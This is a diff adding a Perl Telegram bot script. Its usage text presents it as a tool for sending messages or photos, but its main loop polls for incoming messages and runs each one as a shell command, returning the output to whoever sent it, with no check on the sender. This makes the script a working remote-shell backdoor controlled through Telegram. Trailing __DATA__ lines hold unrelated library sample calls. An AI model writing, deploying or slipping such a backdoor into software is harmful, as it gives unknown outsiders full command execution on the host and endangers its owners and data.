@@ -1,0 +1,110 @@
+#!/usr/bin/env perl
+ 
+use 5.010;
+use WWW::Telegram::BotAPI;
+use Data::Dumper;
+use Getopt::Std;
+
+getopts('m:p:t:i:', \%opts);
+my $post = \%opts;
+
+my $api = WWW::Telegram::BotAPI->new (
+    token   =>  $post->{t},
+);
+
+say $api->getMe->{result}{username};
+
+if( $post->{m} ){
+    $api->sendMessage ({
+        chat_id => $post->{i},
+        text    => $post->{m},
+    });
+} elsif( $post->{p}) {
+    $api->sendPhoto ({
+        chat_id => $post->{i},
+        photo   => { file    =>  $post->{p} },
+        caption => "pic",
+    });
+} else {
+    say "\n\tUsage: bgd -m \'your message\'"; 
+    say "\n\t       bgd -p \'/path/to/your/pic\'"; 
+}
+
+my ($updates, $offset) = 0;
+
+sub send_results {
+    my ($id, $command) = @_;
+    my $results;
+
+    open(my $pipe,'-|',"$command");
+    while(<$pipe>){ $results .= $_ }
+    close $pipe;
+
+    $api->sendMessage ({
+        chat_id => $id,
+        text    => $results,
+    });
+}
+
+
+
+while(1){
+    sleep 5;
+    $updates = $api->getUpdates ({
+            #timeout => 30,
+            $offset ? (offset => $offset) : ()
+        });
+    unless ($updates and ref $updates eq "HASH" and $updates->{ok}) {
+        warn "WARNING: getUpdates returned a false value - trying again...";
+        next;
+    }
+    for my $u (@{$updates->{result}}) {
+        $offset = $u->{update_id} + 1 if $u->{update_id} >= $offset;
+        if (my $text = $u->{message}{text}) { # Text message
+            printf "Incoming text message from \@%s\n", $u->{message}{from}{id};
+            #print Dumper($text);
+            #printf "Text: %s\n", $text;
+            send_results("$u->{message}{from}{id}", $text);
+            print Dumper($u->{message});
+        }
+    }
+}
+
+
+
+
+#Mojo::IOLoop->start;
+
+__DATA__
+$api->api_request ('getMe', sub {
+    my ($ua, $tx) = @_;
+    die unless $tx->success;
+    # ...
+});
+
+
+$api->setWebhook ({ url => 'https://example.com/webhook' }, sub {
+    my ($ua, $tx) = @_;
+    die unless $tx->success;
+    say "Webhook set!"
+});
+
+
+
+say $api->getMe->{result}{username};
+
+$api->sendMessage ({
+    chat_id => 123456,
+    text    => 'Hello world!'
+}, sub {
+    my ($ua, $tx) = @_;
+    die "Something bad happened!" unless $tx->success;
+    say $tx->res->json->{ok} ? "YAY!" : ":(";
+});
+
+$api = WWW::Telegram::BotAPI->new (
+    token => 'my_token',
+    async => 1
+);
+
+
